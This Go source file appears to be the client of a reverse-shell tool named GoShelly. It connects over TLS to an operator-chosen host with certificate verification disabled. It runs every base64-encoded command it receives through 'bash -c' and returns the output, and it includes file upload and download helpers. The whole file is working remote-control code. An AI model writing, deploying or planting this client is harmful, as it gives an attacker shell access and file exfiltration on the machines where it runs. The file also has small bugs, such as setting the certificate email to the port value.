package basic

import (

	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	t "goshelly-client/template"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/mail"
	"os"
	"os/exec"
	"strings"
	"time"
	"math"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
func logClean(dir string) {
	files, _ := ioutil.ReadDir(dir)
	if len(files) < CONFIG.MAXLOGSTORE {
		return
	}

	var newestFile string
	var oldestTime  = math.Inf(1)
	for _, f := range files {

		fi, err := os.Stat(dir + f.Name())
		if err != nil {
			fmt.Println(err)
		}
		currTime := float64(fi.ModTime().Unix())
		if currTime < oldestTime {
			oldestTime = currTime
			newestFile = f.Name()
		}
	}
	os.Remove(dir+newestFile)
}
// file upl /downl functions, if needed
func uploadFile(conn *tls.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func returnLog() {
	bytearr, err := ioutil.ReadFile(CONFIG.LOGNAME)
	if err != nil {
		fmt.Println("Could not get logs.")
	}
	fmt.Println(string(bytearr))

}

func downloadFile(conn *tls.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func execInput(input string) string {
	// Remove the newline character.
	input = strings.TrimSuffix(input, "\n")

	cmd, err := exec.Command("bash", "-c", input).Output()
	if err != nil {
		log.Fatal(err)
	}
	return string(cmd[:])
}

func validateMailAddress(address string) {
	_, err := mail.ParseAddress(address)
	if err != nil {
		CONFIG.CLIENTLOG.Println("Invalid Email Address. Proceeding anyway.")

		return
	}
	CONFIG.CLIENTLOG.Println("Email Verified. True.")
}

func setReadDeadLine(conn *tls.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		CONFIG.CLIENTLOG.Panic("SetReadDeadline failed:", err)
	}
}

func setWriteDeadLine(conn *tls.Conn) {
	err := conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		CONFIG.CLIENTLOG.Panic("SetWriteDeadline failed:", err)
	}
}

func dialReDial(serviceID string, config *tls.Config) *tls.Conn {
	reDial := 0
	for ok := true; ok; ok = reDial < 5 {
		conn, err := tls.Dial("tcp", serviceID, config)
		reDial++
		if err != nil {
			CONFIG.CLIENTLOG.Println("Error: ", err)
			CONFIG.CLIENTLOG.Println("Could not establish connection. Retrying in 5 seconds....")
			time.Sleep(time.Second * 5)
			continue
		}
		CONFIG.CLIENTLOG.Println("Connected to: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
		state := conn.ConnectionState()
		for _, v := range state.PeerCertificates {
			CONFIG.CLIENTLOG.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
			CONFIG.CLIENTLOG.Println(v.Subject)
		}

		CONFIG.CLIENTLOG.Println("client: handshake: ", state.HandshakeComplete)
		CONFIG.CLIENTLOG.Println("client: mutual: ", state.NegotiatedProtocolIsMutual)
		return conn

	}
	CONFIG.CLIENTLOG.Println("Timout. Could not reach server. Exiting....")
	os.Exit(1)
	return nil //will never reach this
}

func genCert() {

	CONFIG.CLIENTLOG.Println("Generating SSL Certificate.")
	validateMailAddress(CONFIG.SSLEMAIL)
	_, err := exec.Command("/bin/bash", "./scripts/certGen.sh", CONFIG.SSLEMAIL).Output()

	if err != nil {
		CONFIG.CLIENTLOG.Printf("Error generating SSL Certificate: %s\n", err)
		os.Exit(1)
	}
}


var CONFIG t.Config

func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {

	CONFIG.HOST = HOST
	CONFIG.PORT = PORT
	CONFIG.SSLEMAIL = PORT
	CONFIG.MAXLOGSTORE = logmax
	CONFIG.LOGNAME = "./logs/" + "GoShelly" + "-" + time.Now().Format(time.RFC1123) + ".log"
	os.MkdirAll("./logs/", os.ModePerm)
	clientfile, err := os.OpenFile(CONFIG.LOGNAME, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Client log open error: %s. No logs for this session available. ", err)
	}
	defer clientfile.Close()
	CONFIG.CLIENTLOG = log.New(clientfile, "", log.LstdFlags)
	if err != nil {
		CONFIG.CLIENTLOG = log.New(os.Stdout,"", log.LstdFlags)
	}

	genCert()

	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if err != nil {
		CONFIG.CLIENTLOG.Println("Could not load SSL Certificate. Exiting...")
		return
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn := dialReDial(CONFIG.HOST+":"+CONFIG.PORT, &config)
	defer conn.Close()

	for {
		buffer := make([]byte, 1024)
		setReadDeadLine(conn)
		_, err := conn.Read(buffer)
		if err != nil {
			CONFIG.CLIENTLOG.Println("Checking status.")
			if err == io.EOF {
				CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
				logClean("./logs/")
				fmt.Println("Exit Success.")
				returnLog()
				os.Exit(0)
			}
		}
		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		CONFIG.CLIENTLOG.Println("EXECUTE: ", string(sDec))
		resp := execInput(string(sDec))
		time.Sleep(time.Second)
		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
		CONFIG.CLIENTLOG.Println("RES:\n", resp)
		setWriteDeadLine(conn)
		_, err = conn.Write([]byte(encodedResp))
		if err != nil {
			CONFIG.CLIENTLOG.Println("Write Error. Exiting. Internal error or server disconnected. Exiting...")
			return
		}
		time.Sleep(time.Second)
		buffer = nil
	}
}
